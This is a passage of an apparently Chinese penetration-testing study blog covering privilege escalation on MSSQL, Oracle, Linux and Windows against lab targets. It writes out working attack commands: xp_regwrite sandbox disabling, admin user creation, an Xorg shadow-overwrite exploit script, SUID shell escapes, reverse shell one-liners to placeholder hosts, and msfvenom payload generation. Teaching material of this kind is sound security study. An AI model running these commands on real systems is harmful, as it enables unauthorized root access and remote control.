&#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt;c:\\sqltest.txt&#39;;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc601473.png" alt="image-20240825005107864"></p><p>返回0 表示成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092cca798e6.png" alt="image-20240825005147760"></p><p>已经写入</p><p>里面就是我们执行命令的结果</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc49babd.png" alt="image-20240825005226057"></p><p>当然也可以删除文件</p><p><code>declare @result int declare @fso_token int exec sp_oacreate &#39;scripting.filesystemobject&#39;, @fso_token out exec sp_oamethod @fso_token,&#39;deletefile&#39;,null,&#39;c:\sqltest.txt&#39; exec sp_oadestroy @fso_token</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cca39c87.png" alt="image-20240825005316171"></p><h4 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h4><p>沙盒是一种安全功能 </p><p>在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.</p><p>如果沙盒可以关闭的话 我们就可以利用沙盒来提权</p><p>看下开没开呢</p><p><code>select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;cmd.exe /c whoami&quot;)&#39;)</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc3182a5.png" alt="image-20240825005650832"></p><p>现在是未开启状态</p><p>我们可以开启一下组件</p><p><code>exec sp_configure &#39;show advanced options&#39;,1 ; reconfigure ; exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,1 ; reconfigure;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc531a4b.png" alt="image-20240825005753268"></p><p>开启组件后会返回400</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc92dcdf.png" alt="image-20240825005815109"></p><p>同理 可以关闭组件</p><p><code>exec sp_configure &#39;show advanced options&#39;,1 ; reconfigure ; exec sp_configure &#39;Ad Hoc Distributed Queries&#39;,0 ; reconfigure;</code></p><p>现在我们可以关闭沙盒了</p><p><code> exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,0;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc8e4e66.png" alt="image-20240825010210501"></p><p>看下当前沙盒模式是什么状态</p><p><code>exec master.dbo.xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;, &#39;SandBoxMode&#39;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc540b12.png" alt="image-20240825010312301"></p><blockquote><p>沙盒模式SandBoxMode参数含义（默认是2）<br>0：在任何所有者中禁止启用安全模式<br>1：为仅在允许范围内<br>2：必须在access模式下<br>3：完全开启</p></blockquote><p>和sp_oacreate类似 创建一个文件 写入命令</p><p><code>Select * From OpenRowSet(&#39;Microsoft.Jet.OLEDB.4.0&#39;,&#39;;Database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;cmd.exe /c whoami &gt;c:\\sqltest.txt &quot;)&#39;);</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092cc97d913.png" alt="image-20240825010447573"></p><p>创建成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc31aa03.png" alt="image-20240825010511858"></p><p>打开文件就是我们命令的执行结果</p><p>当然我们也可以用这些来创建一个用户</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc4dc5be.png" alt="image-20240825011026742"></p><p>现在是没有这个用户的</p><p><code>Select * From OpenRowSet(&#39;Microsoft.Jet.OLEDB.4.0&#39;,&#39;;Database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;net user testq QWEasd123 /add&quot;)&#39;);</code>   创建一个用户testq 密码是QWEasd123</p><p><code>Select * From OpenRowSet(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;Database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;net localgroup administrators testq /add&quot;)&#39;); </code>   把这个用户添加到管理员组</p><p><code>Select * From OpenRowSet(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;Database=c:\windows\system32\ias\ias.mdb&#39;,&#39;select shell(&quot;net user testq&quot;)&#39;);</code>   看下这个用户在不在</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc5403e8.png" alt="image-20240825011118708"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc98a54a.png" alt="image-20240825011145944"></p><h3 id="Oracle提权"><a href="#Oracle提权" class="headerlink" title="Oracle提权"></a>Oracle提权</h3><p><img src="https://bu.dusays.com/2024/10/11/67092cc43e666.png" alt="image-20240825011506963"></p><p>木马已经传上来了</p><p>因为这个靶场环境是java环境(Apache Tocat)</p><p>所有木马是.jsp的</p><p>哥斯拉连接</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc43e664.png" alt="image-20240825011722077"></p><p>发现它默认就是system权限</p><p>system权限当然就不用提了</p><p>如果不是 说明他是集成环境搭建的</p><p>他的默认路径是Tomcat&#x2F;webapps&#x2F;root</p><p>配置文件也在这里</p><p><img src="https://bu.dusays.com/2024/10/11/67092ccbb27fe.png" alt="image-20240825012113642"></p><p>oracle数据库默认的是1521端口</p><p>账号：scott</p><p>密码：tiger</p><p>这个testdb是他的sid号</p><p>我们使用这个工具来</p><p>OracleShell来提权</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc5b6c76.png" alt="image-20240825012525157"></p><p>填一下信息</p><p>注意 模式选择DBA模式 普通模式也行</p><p>连接成功后可以反弹shell</p><p><img src="https://bu.dusays.com/2024/10/11/67092cc930484.png" alt="image-20240825012636851"></p><p>可以看到数据库里的所有东西</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权</title>
      <link href="/2024/10/11/Linux%E6%8F%90%E6%9D%83/"/>
      <url>/2024/10/11/Linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>一键配环境</p><p><a href="https://github.com/ffffffff0x/f8x/blob/main/README.zh-cn.md">f8x集成环境</a></p><h3 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h3><p><a href="https://github.com/rebootuser/LinEnum">信息收集脚本1</a></p><p>LinEnum</p><p>把文件上传到目标服务器内</p><p>解压</p><p><img src="https://bu.dusays.com/2024/10/11/67092bdc3a0c3.png" alt="image-20240823111913527"></p><p>绿色的表示有执行权限</p><p>可以按照参数来执行命令 </p><p>也可以这样：</p><p><code>./LinEnum.sh &gt;&gt; 1.txt</code></p><p>把收集到的信息重定向到1.txt</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd3ec265.png" alt="image-20240823112537906"></p><p>收集成功</p><p>信息收集脚本2</p><p>linuxprivchecker-master</p><p>这个脚本需要目标主机有python环境</p><p><img src="https://bu.dusays.com/2024/10/11/67092bdc3762d.png" alt="image-20240823133639370"></p><p>看到有py文件</p><p>同样的</p><p><code>python linuxprivchecker.py &gt;&gt; 2.txt</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092bd8956e2.png" alt="image-20240823133936998"></p><p>收集成功</p><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><h4 id="提权流程"><a href="#提权流程" class="headerlink" title="提权流程"></a>提权流程</h4><p>我们先看下这个命令</p><p><code> uname -r</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092bd6bb38b.png" alt="image-20240823134231068"></p><blockquote><p>3.10.0-1160.el7.x86_64</p></blockquote><p>3–&gt;内核版本</p><p>10–&gt;稳定版(技术开发版 偶数稳定版)</p><p>0–&gt;补丁修补次数 这里是0次</p><p>后面的是具体详情</p><p>linux内核提权和windows的很像</p><p>需要漏洞</p><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">漏洞探测</a></p><p>把文件传到目标主机上</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd805af5.png" alt="image-20240823135145239"></p><p>看到有可执行文件</p><p>同样的 运行脚本</p><p><code>./linux-exploit-suggester.sh</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092bdfe7ab4.png" alt="image-20240823135455093"></p><p>看到很多漏洞可以利用</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd6d7053.png" alt="image-20240823135605002"></p><p>Details:漏洞详情 参考连接</p><p>Exposure: 攻击成功的可能性</p><ul><li>highly probable 极有可能</li><li>probable低可能</li><li>less probable较不可能</li></ul><p>Tags:漏洞影响的版本号</p><p>Download: 漏洞对应exp下载地址</p><p>Comment: 注释评论</p><p>linux-exploit-suggester-2的话会更简介一点</p><p><code> ./linux-exploit-suggester-2.pl</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092bd89fbfc.png" alt="image-20240823140630604"></p><p>所以内核提权步骤：</p><blockquote><p>信息收集收集对应的可提权的exp</p><p>下载exp</p><p>编译、运行</p></blockquote><p>如果没找到对应exp</p><p>可以在漏洞数据库里找</p><p><a href="https://www.exploit-db.com/">漏洞数据库</a></p><p>或者github</p><p>这里我们用CVE-2018-14665试下</p><p>exp下载下载：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo Xorg x11 exploit</span><br><span class="line">cd /etc</span><br><span class="line">Xorg -fp &#x27;root:0:99999:7:::&#x27; -logfile shadow :1 &amp;</span><br><span class="line">sleep 5</span><br><span class="line">pkill Xorg</span><br><span class="line">echo [+] hit enter for root</span><br><span class="line">su root</span><br></pre></td></tr></table></figure><p>失败了啊</p><p><img src="https://bu.dusays.com/2024/10/11/67092be16a94f.png" alt="image-20240823232728133"></p><p>没关系 换一个CVE用就行</p><p>CVE-2016-0728一般不会用 会跑性能带宽</p><p>试下CVE-2014-0038呢</p><p><img src="https://bu.dusays.com/2024/10/11/67092bde97fa7.png" alt="image-20240823233342856"></p><p>看到要gcc编译一下</p><p>下载</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd5a6f62.png" alt="image-20240823233410846"></p><p>按他给的步骤试下</p><p><img src="https://bu.dusays.com/2024/10/11/67092be345370.png" alt="image-20240823235308809"></p><p>失败了</p><p>斯</p><p>应该是我centos的问题 可能换个靶机就成功了</p><p>总之流程就是这样</p><h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p><strong>CVE-2016-5195</strong></p><p>脏牛提权也是内核提权的一种 但是一般都能提上去 而且任意linux都可以尝试脏牛提权</p><p>漏洞影响范围：Liunx kernel &gt;&#x3D; 2.6.22 的所有Linux系统</p><p>漏洞原理：在Linux内核的内存子系统处理私有只读内存映射的写时复制（COW）损坏的方式中发现了一种竞争状况。一个没有特权的本地用户可以使用此漏洞来获取对只读存储器映射的写访问权，从而增加他们在系统上的特权。</p><p>三种编译c形式：</p><blockquote><p>gcc xxx.c -o xxx<br>make<br>gcc -pthread xxx.c -o xxx -lcrypt</p></blockquote><p>现在我们打一下msf的靶机</p><p><a href="https://information.rapid7.com/download-metasploitable-2017-thanks.html">msf靶机</a></p><p>默认账户：msfadmin<br>默认密码：msfadmin</p><p>现在我已经把找到的脏牛的exp放在了靶机上</p><p><img src="https://bu.dusays.com/2024/10/11/67092bdd7a84b.png" alt="image-20240824001925099"></p><p>看到了dirty.c</p><p>gcc编译</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd8456bf.png" alt="image-20240824002038904"></p><p>有执行权限</p><p><img src="https://bu.dusays.com/2024/10/11/67092bdee36a3.png" alt="image-20240824002127973"></p><p>运行</p><p><code>./dirty</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092bd6e54a9.png" alt="image-20240824002209172"></p><p>输入密码自定</p><p>他会帮我们创建一个新用户 权限是root</p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092be5d5761.png" alt="image-20240824002533879"></p><h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。SUID可以让调用者以文件拥有者的身份运行该文件，通过调用root用户所拥有的suid文件，运行时我们就获得了root权限</p><p>我们还是来打msf靶机</p><p><img src="https://bu.dusays.com/2024/10/11/67092be58188b.png" alt="image-20240824003403948"></p><p>可以看到 红色文件名的文件有S权限</p><p>这就是suid文件</p><p>我们可以赋给文件S权限</p><p><code>chmod u+s dirty.c</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092bdcc99b8.png" alt="image-20240824003624401"></p><p>移除s权限</p><p><code>chmod u-s dirty.c</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092bd769419.png" alt="image-20240824003801340"></p><p>在linux中有一些文件本身就是suid文件</p><p>所以：</p><p>suid文件查找：</p><blockquote><p>以下命令将尝试查找具有root权限的SUID文件，不同系统适用于不同的命令，一个一个试<br>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092be452899.png" alt="image-20240824004010886"></p><p>当然也可以用信息收集的东西</p><p>脚本梭哈</p><p><img src="https://bu.dusays.com/2024/10/11/67092be6c46f3.png" alt="image-20240824004223263"></p><p>有关键信息–suid文件地址</p><p>那我们怎么基于这些文件来提权呢</p><p>需要文件有这些关键字：</p><blockquote><p>Nmap<br>Vim<br>find<br>Bash<br>More<br>Less<br>Nano<br>cp</p><p>netcat</p><p>exim</p><p>awk</p></blockquote><p>没有就提权不了</p><p>找到一个nmap</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd6d8f05.png" alt="image-20240824004705914"></p><p>nmap需要执行一下命令</p><p><code>nmap --interactive </code>  启动一个交互式的nmap</p><p><code>!sh</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092be15d34d.png" alt="image-20240824005040531"></p><p>提权成功</p><p>不同的文件提权方式是不同的</p><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><blockquote><p>find 具有suid权限的filename -exec whoami ; -quit<br>#root</p><p>find 具有suid权限的filename -exec &#x2F;bin&#x2F;sh -p ; -quit<br>#whoami<br>#root</p><p>find 具有suid权限的filename -exec “&#x2F;bin&#x2F;bash” -p ;                            #whami                                                                        #root</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092bdb5fc3f.png" alt="image-20240824010341257"></p><p><img src="https://bu.dusays.com/2024/10/11/67092bdc1ace6.png" alt="image-20240825214945511"></p><blockquote><p>#先前利用以上查找suid文件查询到了&#x2F;usr&#x2F;bin&#x2F;find 有suid权限<br>touch 1.txt #创建1.txt<br>&#x2F;usr&#x2F;bin&#x2F;find 1.txt -exec whoami ;</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092bdb630fc.png" alt="image-20240905185412641"></p><p>反弹shell</p><blockquote><p>靶机：</p><p>find user -exec nc -lvp 4444 -e ‘&#x2F;bin&#x2F;sh’ ;</p><p>kali:</p><p>nc 靶机ip 4444</p><p>靶机：</p><p>find 具有suid权限的filename -exec bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1’ ;</p><p>kali:</p><p>nc -lvp port</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092be0bb6c7.png" alt="image-20240905185619921"></p><blockquote><p>python -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ip”,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);</p></blockquote><p>root的反弹shell</p><p>或者</p><blockquote><p>&#x2F;usr&#x2F;bin&#x2F;find 1.txt -exec python -c  ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ip”,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’ ;</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092be048846.png" alt="image-20240905185742987"></p><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>适用版本：nmap2.02至5.21</p><blockquote><p>nmap –interactive</p></blockquote><p>然后</p><blockquote><p>nmap&gt; !sh</p><p>sh-3.2# whoami<br>root</p></blockquote><h4 id="less-more"><a href="#less-more" class="headerlink" title="less&#x2F;more"></a>less&#x2F;more</h4><p>less和more一样</p><blockquote><p>less &#x2F;etc&#x2F;passwd</p></blockquote><blockquote><p>!&#x2F;bin&#x2F;sh</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092bd6bedbe.png" alt="image-20240905190254479"></p><blockquote><p>VISUAL&#x3D;”&#x2F;bin&#x2F;sh -c ‘&#x2F;bin&#x2F;sh’” less &#x2F;etc&#x2F;profile<br>v</p></blockquote><blockquote><p>less &#x2F;etc&#x2F;profile<br>v:shell</p></blockquote><p>也是可以进入交互界面然后写入shell的</p><blockquote><p>sudo install -m &#x3D;xs $(which less) .</p><p>.&#x2F;less file_to_read</p></blockquote><p>如果二进制文件设置了 SUID 位，则它不会丢弃提升的权限，并且可能会被滥用来访问文件系统、升级或维护作为 SUID 后门的特权访问。如果它用于运行，则省略像 Debian （&lt;&#x3D; Stretch） 这样的系统上允许默认 shell 以 SUID 权限运行的参数。<code>sh -p``-p``sh</code></p><p>此示例创建二进制文件的本地 SUID 副本并运行它以维护提升的权限。要与现有 SUID 二进制文件交互，请跳过第一个命令并使用其原始路径运行程序。</p><p><strong>使用more和less一定读取一个比较大的文件，如果文件太小无法进入翻页功能，无法使用<code>!</code>命令进入shell。</strong></p><h4 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h4><blockquote><p>nano<br>ctrl + R<br>ctrl + X<br>#shell</p></blockquote><h4 id="cp-mv"><a href="#cp-mv" class="headerlink" title="cp&#x2F;mv"></a>cp&#x2F;mv</h4><blockquote><p>whoami<br>#qszd</p><p>cat &#x2F;etc&#x2F;passwd</p><p>openssl passwd -1 -salt test testaaa</p><p>echo ‘test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::&#x2F;root&#x2F;:&#x2F;bin&#x2F;sh’ &gt;&gt; passwd</p><p>echo ‘test:$1$test$giCVmzusADSPMon2mwEWo1:0:0::&#x2F;root&#x2F;:&#x2F;bin&#x2F;sh’ &gt;&gt; passwd</p><p>su - test</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092be4e17a7.png" alt="image-20240905190750878"></p><h4 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h4><blockquote><p>vim.tiny &#x2F;etc&#x2F;passwd</p></blockquote><blockquote><p>:!&#x2F;bin&#x2F;sh</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092bd6c0b40.png" alt="image-20240905190844714"></p><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><blockquote><p>id<br>#uid&#x3D;1024(qsdz) gid&#x3D;999(qsdz) groups&#x3D;999(qsdz)</p><p>bash -p<br>#生成一个  bash-3.2#</p><p>bash-3.2# id<br>#uid&#x3D;1024(qsdz) gid&#x3D;999(qsdz) euid&#x3D;0(root) groups&#x3D;999(qsdz)</p></blockquote><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><p>awk利用以下命令进入shell，其原理和上面的bash差不多</p><blockquote><p>awk ‘BEGIN {system(“&#x2F;bin&#x2F;bash”)}’</p><p>bash-3.2$ whoami<br>#root</p></blockquote><h3 id="MSF提权"><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h3><p>同样msf也可以进行linux的提取</p><p>msfvenom生成木马</p><p>这里的payload和之前的不一样</p><p><code> uname -r</code></p><p>看下版本信息</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd6dfbe1.png" alt="image-20240824010949832"></p><p>表明x86和x64都可以用</p><p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.172 LPORT=6363 -f elf -o shell.elf</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092be4528a7.png" alt="image-20240824011300853"></p><p>这样就生成了一个linux的木马</p><p>再传到目标主机上</p><p><img src="https://bu.dusays.com/2024/10/11/67092be257587.png" alt="image-20240824011408278"></p><p>现在我们msf开一个监听</p><p><img src="https://bu.dusays.com/2024/10/11/67092bdfdc8a7.png" alt="image-20240824011511907"></p><p>目标主机执行</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd7af407.png" alt="image-20240824011538176"></p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092bd4cb295.png" alt="image-20240824011600289"></p><p>不能直接上权限</p><p>先信息收集</p><p><img src="https://bu.dusays.com/2024/10/11/67092be632d84.png" alt="image-20240824011802517"></p><p>然后就是search CVE-2016-5195</p><p>慢慢打就行</p><p>当然也可以用这个模块</p><p><code>use post/multi/recon/local_exploit_suggester</code></p><p>会自动检查可以利用的漏洞</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权</title>
      <link href="/2024/10/11/Windows%E6%8F%90%E6%9D%83/"/>
      <url>/2024/10/11/Windows%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h2><h3 id="权限分类"><a href="#权限分类" class="headerlink" title="权限分类"></a>权限分类</h3><p>在Windows系统中，权限大概分为四中，分别是：</p><ul><li><p>User：普通用户权限</p></li><li><p>Administrator：管理员权限，可以利用Windows机制提升为System权限</p></li><li><p>System：系统权限</p></li><li><p>TrustedInstaller：Windows中最高权限。有些文件，连System权限也无法修改，只能TrustedInstaller权限修改。TrustedInstaller为Windows系统中众多系统内置安全主体中的一个，本身是系统重要服务，用户无法直接在此服务的上下文中运行程序或另一个服务。它是操作系统上用来对系统进行维护、更新等操作的组。在Windows XP及以前，System账户与管理员组对系统文件都有着完全访问的权限。 这意味着以管理员身份运行的程序可以任意更改系统，降低了系统安全性。TrustedInstaller则改变了这一情况，使得只有拥有TrustedInstaller令牌的系统进程才能更改系统重要内容，而其他大部分系统服务就没有权限</p></li></ul><p><strong>我们windows下的提权目的是把user&#x2F;administrator权限提升到system权限</strong></p><p><strong>提权也是基于漏洞来提权的</strong></p><h3 id="windows内核溢出提权漏洞"><a href="#windows内核溢出提权漏洞" class="headerlink" title="windows内核溢出提权漏洞"></a><strong>windows内核溢出提权漏洞</strong></h3><p>本地溢出提权首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出Administrator权限</p><p><strong>收集相应的补丁信息，通过工具查找打了对应的补丁，还能够使用什么漏洞进行提权</strong></p><p>重点：我们要去什么地方找到提权的exp</p><p>实际情况下，目标的环境都是不一样的</p><p>这里用哥斯拉拿到webshell权限</p><p><img src="https://bu.dusays.com/2024/10/11/67092b4f92ead.png" alt="image-20240822171319405"></p><p>当前权限为webshell</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3c92056.png" alt="image-20240822171406596"></p><p>好 哥斯拉上面那个PMeterprater就是它的后渗透模块</p><p>我们通过这个模块转交给MSF</p><p><img src="https://bu.dusays.com/2024/10/11/67092b55832f9.png" alt="image-20240822171602481"></p><p>按照他给的命令输就行(MSF上输)</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3f7affa.png" alt="image-20240822171831993"></p><p>哥斯拉上面配置一下kali ip</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3ce97bc.png" alt="image-20240822172035753"></p><p>先load后go</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3d80520.png" alt="image-20240822172133826"></p><p>上线</p><p>转给CS就再通过MSF转CS就行</p><p>现在我们通过MSF生成木马 再上传 </p><p>MSF先开监听</p><p><img src="https://bu.dusays.com/2024/10/11/67092b541a27e.png" alt="image-20240822172713174"></p><p>注意要重设payload和lport</p><p>再上传木马</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3d774e2.png" alt="image-20240822172826618"></p><p>运行木马</p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3e4dc9b.png" alt="image-20240822172935122"></p><p>看下权限</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3d19f13.png" alt="image-20240822173056048"></p><p>已经从webshell权限变成普通用户权限</p><p>并且可以执行getsystem了</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3c76422.png" alt="image-20240822173339168"></p><p>提权成功</p><p>因为我这台靶机是在域的管理员组里所以可以用getsystem提权</p><p><img src="https://bu.dusays.com/2024/10/11/67092b4f4f2ed.png" alt="image-20240822173739907"></p><p>好现在我们把靶机改到普通用户组</p><p><img src="https://bu.dusays.com/2024/10/11/67092b4feaaac.png" alt="image-20240822174059798"></p><p>此时我们在执行木马并监听是能上线的 但是getsystem无法执行成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092b483806a.png" alt="image-20240822174210121"></p><p>现在我们来提权</p><p>首先 我们先收集系统的补丁信息</p><p>shell</p><p>systeminfo</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3daf6f6.png" alt="image-20240822174402711"></p><p><img src="https://bu.dusays.com/2024/10/11/67092b4fd9fd6.png" alt="image-20240822174434597"></p><p>这条命令也可以看到补丁信息</p><p><code>Wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092b55cb209.png" alt="image-20240822174606749"></p><p>还有这个工具</p><p><a href="github.com/bitsadmin/wesng">wesng</a></p><p>这个工具可以基于补丁信息 来看下有什么漏洞可以提权（会生成excl表格）</p><p>先在工具的目录下新建一个1.txt里面存放systeminfo出的数据</p><p><img src="https://bu.dusays.com/2024/10/11/67092b56bf07a.png" alt="image-20240822180106962"></p><p><img src="https://bu.dusays.com/2024/10/11/67092b3d283ed.png" alt="image-20240825000415832"></p><p>然后cmd</p><p>更新一下数据库</p><p><code>python wes.py --update</code></p><p>然后输出</p><p>python wes.py 1.txt -o tese.csv</p><p><img src="https://bu.dusays.com/2024/10/11/67092b55d7267.png" alt="image-20240822180334769"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092b5835e51.png" alt="image-20240822180521964"></p><p>还有</p><p><a href="https://blog.neargle.com/win-powerup-exp-index/">补丁查询网站</a></p><p><img src="https://bu.dusays.com/2024/10/11/67092b3f7a9e5.png" alt="image-20240822181013257"></p><p>msf上也有补丁查询模块</p><p><code>use post/windows/gather/enum_patches</code></p><p>只需要设置session</p><p><img src="https://bu.dusays.com/2024/10/11/67092b49dfe1a.png" alt="image-20240822181401084"></p><p><img src="https://bu.dusays.com/2024/10/11/67092b5033ddc.png" alt="image-20240822181442154"></p><p>再用</p><p><code>use post/multi/recon/local_exploit_suggester</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092b4f4fc0e.png" alt="image-20240822181622442"></p><p>同样只需要设置session</p><p><img src="https://bu.dusays.com/2024/10/11/67092b578dff5.png" alt="image-20240822181802530"></p><p>绿色的效果好点</p><p>然后就是用MSF利用相关漏洞了</p><p>这里就随便用一个</p><p><img src="https://bu.dusays.com/2024/10/11/67092b51bcf82.png" alt="image-20240822182131541"></p><p>同样只需要配session</p><p>run</p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092b542b938.png" alt="image-20240822182221546"></p><p>看到已经是system权限了</p><p>但是注意 这个system权限仅在会话中是system权限 靶机还是普通用户权限(临时提权)</p><blockquote><p>提权exp</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p><p><a href="https://github.com/lyshark/Windows-exploits">https://github.com/lyshark/Windows-exploits</a></p><p><a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a> </p><p><a href="https://github.com/ianxtianxt/win-exp-">https://github.com/ianxtianxt/win-exp-</a></p><p><a href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a> </p></blockquote><p>这里有除了MSF的利用脚本</p><h3 id="UAC提权绕过"><a href="#UAC提权绕过" class="headerlink" title="UAC提权绕过"></a>UAC提权绕过</h3><p>UAC(User Account Control，用户账号控制) 是微软为了提高系统安全性在Windows 